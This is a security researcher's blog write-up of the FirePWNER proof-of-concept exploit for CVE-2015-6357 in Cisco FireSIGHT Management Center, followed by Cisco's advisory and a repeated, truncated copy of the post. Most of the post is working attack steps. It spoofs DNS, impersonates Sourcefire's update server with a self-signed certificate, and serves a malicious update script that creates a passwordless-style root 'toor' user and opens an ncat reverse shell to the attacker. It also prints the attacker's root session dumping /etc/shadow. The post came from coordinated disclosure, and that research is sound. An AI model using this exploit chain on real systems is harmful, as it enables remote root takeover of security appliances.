command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a “compromised” DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the “compromised” DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```
## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```
## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the “compromised” DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the “compromised” DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker’s server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```
## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner "CVE-2015-6357 Exploit Code").

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan’s findings published.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[21:20](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/1013694973102085061 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=1013694973102085061&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=pinterest "Share to Pinterest")

Labels:
[cisco](https://wadofstuff.blogspot.com/search/label/cisco),
[cve](https://wadofstuff.blogspot.com/search/label/cve),
[exploit](https://wadofstuff.blogspot.com/search/label/exploit),
[security](https://wadofstuff.blogspot.com/search/label/security)

#### No comments:

[Post a Comment](https://www.blogger.com/comment/fullpage/post/4770774760495172381/1013694973102085061)

[Older Post](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html "Older Post")

[Home](https://wadofstuff.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://wadofstuff.blogspot.com/feeds/1013694973102085061/comments/default)

## About Me

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876)

[View my complete profile](https://www.blogger.com/profile/15093905875465763876)

## Subscribe To

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2F1013694973102085061%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2F1013694973102085061%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/1013694973102085061/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

## Labels

[advisory](https://wadofstuff.blogspot.com/search/label/advisory)
(1)

[apache](https://wadofstuff.blogspot.com/search/label/apache)
(2)

[apple](https://wadofstuff.blogspot.com/search/label/apple)
(3)

[buildbot](https://wadofstuff.blogspot.com/search/label/buildbot)
(2)

[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint)
(1)

[cisco](https://wadofstuff.blogspot.com/search/label/cisco)
(1)

[cve](https://wadofstuff.blogspot.com/search/label/cve)
(1)

[dhcp](https://wadofstuff.blogspot.com/search/label/dhcp)
(2)

[django](https://wadofstuff.blogspot.com/search/label/django)
(12)

[dtrace](https://wadofstuff.blogspot.com/search/label/dtrace)
(1)

[exploit](https://wadofstuff.blogspot.com/search/label/exploit)
(1)

[flash archive](https://wadofstuff.blogspot.com/search/label/flash%20archive)
(4)

[forms](https://wadofstuff.blogspot.com/search/label/forms)
(2)

[infrastructure](https://wadofstuff.blogspot.com/search/label/infrastructure)
(5)

[iphoto](https://wadofstuff.blogspot.com/search/label/iphoto)
(3)

[ipv4](https://wadofstuff.blogspot.com/search/label/ipv4)
(6)

[ipv6](https://wadofstuff.blogspot.com/search/label/ipv6)
(7)

[jass](https://wadofstuff.blogspot.com/search/label/jass)
(7)

[json](https://wadofstuff.blogspot.com/search/label/json)
(3)

[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart)
(10)

[macosx](https://wadofstuff.blogspot.com/search/label/macosx)
(2)

[models](https://wadofstuff.blogspot.com/search/label/models)
(1)

[networking](https://wadofstuff.blogspot.com/search/label/networking)
(4)

[nfs](https://wadofstuff.blogspot.com/search/label/nfs)
(2)

[nmap](https://wadofstuff.blogspot.com/search/label/nmap)
(2)

[openvpn](https://wadofstuff.blogspot.com/search/label/openvpn)
(1)

[perl](https://wadofstuff.blogspot.com/search/label/perl)
(1)

[programming](https://wadofstuff.blogspot.com/search/label/programming)
(9)

[python](https://wadofstuff.blogspot.com/search/label/python)
(14)

[ruby](https://wadofstuff.blogspot.com/search/label/ruby)
(1)

[security](https://wadofstuff.blogspot.com/search/label/security)
(3)

[serializer](https://wadofstuff.blogspot.com/search/label/serializer)
(4)

[servicetags](https://wadofstuff.blogspot.com/search/label/servicetags)
(2)

[smf](https://wadofstuff.blogspot.com/search/label/smf)
(6)

[solaris](https://wadofstuff.blogspot.com/search/label/solaris)
(31)

[splunk](https://wadofstuff.blogspot.com/search/label/splunk)
(4)

[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)
(1)

[testing](https://wadofstuff.blogspot.com/search/label/testing)
(1)

[zfs](https://wadofstuff.blogspot.com/search/label/zfs)
(3)

## Blog Archive

* ▼
  [2015](https://wadofstuff.blogspot.com/2015/)
  (2)
  + ▼
    [November](https://wadofstuff.blogspot.com/2015/11/)
    (1)
    - [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIG...](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)
  + ►
    [April](https://wadofstuff.blogspot.com/2015/04/)
    (1)

* ►
  [2012](https://wadofstuff.blogspot.com/2012/)
  (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2012/03/)
    (1)

* ►
  [2011](https://wadofstuff.blogspot.com/2011/)
  (4)
  + ►
    [August](https://wadofstuff.blogspot.com/2011/08/)
    (1)
  + ►
    [July](https://wadofstuff.blogspot.com/2011/07/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2011/06/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2011/02/)
    (1)

* ►
  [2010](https://wadofstuff.blogspot.com/2010/)
  (4)
  + ►
    [December](https://wadofstuff.blogspot.com/2010/12/)
    (1)
  + ►
    [November](https://wadofstuff.blogspot.com/2010/11/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2010/09/)
    (2)

* ►
  [2009](https://wadofstuff.blogspot.com/2009/)
  (18)
  + ►
    [November](https://wadofstuff.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2009/10/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://wadofstuff.blogspot.com/2009/07/)
    (4)
  + ►
    [May](https://wadofstuff.blogspot.com/2009/05/)
    (3)
  + ►
    [April](https://wadofstuff.blogspot.com/2009/04/)
    (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2009/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2009/02/)
    (3)

* ►
  [2008](https://wadofstuff.blogspot.com/2008/)
  (8)
  + ►
    [September](https://wadofstuff.blogspot.com/2008/09/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2008/06/)
    (2)
  + ►
    [April](https://wadofstuff.blogspot.com/2008/04/)
    (3)
  + ►
    [March](https://wadofstuff.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2008/02/)
    (1)

* ►
  [2007](https://wadofstuff.blogspot.com/2007/)
  (20)
  + ►
    [November](https://wadofstuff.blogspot.com/2007/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2007/10/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2007/09/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2007/08/)
    (2)
  + ►
    [May](https://wadofstuff.blogspot.com/2007/05/)
    (2)
  + ►
    [March](https://wadofstuff.blogspot.com/2007/03/)
    (5)
  + ►
    [February](https://wadofstuff.blogspot.com/2007/02/)
    (4)
  + ►
    [January](https://wadofstuff.blogspot.com/2007/01/)
    (2)

## Projects

* [Wad of Stuff code repository](https://github.com/mattimustang/wadofstuff)
* [iPhoto Keyword Utilities](https://github.com/mattimustang/iphotokeywordutilities)

|  |  |
| --- | --- |

Travel theme. Theme images by [sandsun](http://www.istockphoto.com/googleimages.php?id=7944350&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).



=== Content from tools.cisco.com_7b8c3ec6_20250125_072855.html ===


[Home](https://www.cisco.com)  / [Cisco Security](/security/center/home.x) / [Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x)

|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| | Cisco Security AdvisoryCisco FireSIGHT Management Center Certificate Validation Vulnerability Medium   Advisory ID:  cisco-sa-20151116-fmc  First Published: 2015 November 16 10:00 GMT  Last Updated:  2015 November 30 20:58 GMT  Version 1.3:  [Final](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#final)   Workarounds:  [Yes](#workarounds)   Cisco Bug IDs: [CSCuw06444](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCuw06444)     CVE-2015-6357     CWE-20       CVSS Score: [Base 5.1, Temporal 4.8](https://sec.cloudapps.cisco.com/security/center/cvssCalculator.x?version=2.0&vector=AV:N/AC:H/Au:N/C:P/I:P/A:P/E:F/RL:U/RC:C)**Click Icon to Copy Verbose Score** AV:N/AC:H/Au:N/C:P/I:P/A:P/E:F/RL:U/RC:C       CVE-2015-6357     CWE-20       Email      Summary  * A vulnerability in the rule update functionality of Cisco FireSIGHT Management Center (MC) could allow an unauthenticated, remote attacker to manipulate the content of the rule update packages and execute arbitrary code on the system.  Affected Products  * Vulnerable ProductsCisco FireSIGHT Management Center software versions 5.4, 5.3, and 5.2 are vulnerable.Products Confirmed Not VulnerableNo other Cisco products are currently known to be affected by this vulnerability.  Workarounds  * Possible workarounds to avoid a DNS hijacking attack follow:    + Turn off automatic updates and manually verify that the support.sourcefire.com host resolves to one of the IP addresses from the pool (listed in this section) before manually initiating an update of the rules   + Configure the firewall to allow the IP address of the MC to connect externally only toward a limited set of addresses, including the support.sourcefire.com address pool (listed in this section) and 198.148.79.58 (intelligence.sourcefire.com)   The following IP addresses are the address pool for support.sourcefire.com:   + 50.19.123.95   + 50.16.210.129   + 54.221.210.248   + 54.221.211.1   + 54.221.212.60   + 54.221.212.170   + 54.221.212.241   + 54.221.213.96   + 54.221.213.209   + 54.221.214.25   + 54.221.214.81  Fixed Software  * When considering software upgrades, customers are advised to consult the Cisco Security Advisories and Responses archive at <http://www.cisco.com/go/psirt> and review subsequent advisories to determine exposure and a complete upgrade solution.  In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.  Exploitation and Public Announcements  * The Cisco Product Security Incident Response Team (PSIRT) is aware that proof-of-concept exploit code is available for the vulnerability described in this advisory. The Cisco PSIRT is not aware of any malicious exploitation of this vulnerability.  Source  * Cisco would like to thank security researcher Matthew Flanagan for discovering and reporting this vulnerability.  Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html)  URL  * <https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc>  Revision History  * | Version | Description | Section | Status | Date |   | --- | --- | --- | --- | --- |   | 1.3 | Updated workarounds to clarify IP addresses for Sourcefire support and intelligence. | Workarounds | Final | 2015-November-30 |   | 1.2 | Updated to indicate that proof-of-concept code is available. | Exploitation and Public Announcements | Final | 2015-November-17 |   | 1.1 | Updated the Vulnerable Products section to include major release versions 5.4, 5.3, and 5.2. | Vulnerable Products | Final | 2015-November-16 |   | 1.0 | Initial public release. | - | Final | 2015-November-13 |      Show Less  ---   Legal Disclaimer  * THIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE. YOUR USE OF THE INFORMATION ON THE DOCUMENT OR MATERIALS LINKED FROM THE DOCUMENT IS AT YOUR OWN RISK. CISCO RESERVES THE RIGHT TO CHANGE OR UPDATE THIS DOCUMENT AT ANY TIME.  A standalone copy or paraphrase of the text of this document that omits the distribution URL is an uncontrolled copy and may lack important information or contain factual errors. The information in this document is intended for end users of Cisco products.   Feedback  * Leave additional feedback     Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) |        | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | |



=== Content from wadofstuff.blogspot.com_55b284d9_20250126_071543.html ===


# [Wad of Stuff](https://wadofstuff.blogspot.com/)

IT infrastructure automation, security research, tools, tips and tricks.

## Monday, 16 November 2015

### [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a “compromised” DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the “compromised” DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```
## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```
## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the “compromised” DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
